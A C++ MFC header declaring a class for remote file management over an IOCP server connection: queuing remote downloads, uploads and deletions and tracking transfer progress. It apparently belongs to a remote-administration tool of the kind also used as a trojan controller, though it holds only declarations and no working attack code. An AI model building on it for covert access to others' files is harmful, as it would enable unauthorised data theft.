#if !defined(AFX_FILEMANAGERAUTO__INCLUDED_)
#define AFX_FILEMANAGERAUTO__INCLUDED_
#include "TrueColorToolBar.h"	// Added by ClassView
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// FileManagerDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CFileManagerAuto dialog
typedef CList<CString, CString&> strList;

class CFileManagerAuto// : public CDialog
{
// Construction
public:
	BOOL m_bIsStop;
	CString m_strReceiveLocalFile;
	CString m_strUploadRemoteFile;
	void SendStop();
	int m_nTransferMode;
	CString m_hCopyDestFolder;
	void SendContinue();
	void SendException();
	void EndLocalRecvFile();
	void EndRemoteDeleteFile();
	CString m_strOperatingFile; // 文件名
	__int64 m_nOperatingFileLength; // 文件总大小
	__int64	m_nCounter;// 计数器
	void WriteLocalRecvFile();
	void CreateLocalRecvFile();
	BOOL SendDownloadJob();
	BOOL SendDeleteJob();
	void OnRemoteDelete();

	strList m_Remote_Download_Job;
	strList m_Remote_Upload_Job;
	strList m_Remote_Delete_Job;
	CString m_Remote_Path;
	CString GetParentDirectory(CString strPath);
	void OnReceiveComplete();


	int m_nNewIconBaseIndex; // 新加的ICON

	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;

	CProgressCtrl* m_ProgressCtrl;
	HCURSOR m_hCursor;
	CString m_Local_Path;

	HICON m_hIcon;
	CStatusBar m_wndStatusBar;
	CFileManagerAuto(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor


// Implementation

protected:
	BOOL		m_bDragging;	//T during a drag operation
	int			m_nDragIndex;	//Index of selected item in the List we are dragging FROM
	int			m_nDropIndex;	//Index at which to drop item in the List we are dropping ON
	CWnd*		m_pDropWnd;		//Pointer to window we are dropping on (will be cast to CListCtrl* type)

private:
	BOOL m_bIsUpload; // 是否是把本地主机传到远程上，标志方向位
	BOOL MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
	void SendTransferMode();
	void SendFileData();
	void EndLocalUploadFile();
	BOOL DeleteDirectory(LPCTSTR lpszDirectory);
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_FILEMANAGERDLG_H__4918F922_13A4_4389_8027_5D4993A6DB91__INCLUDED_)
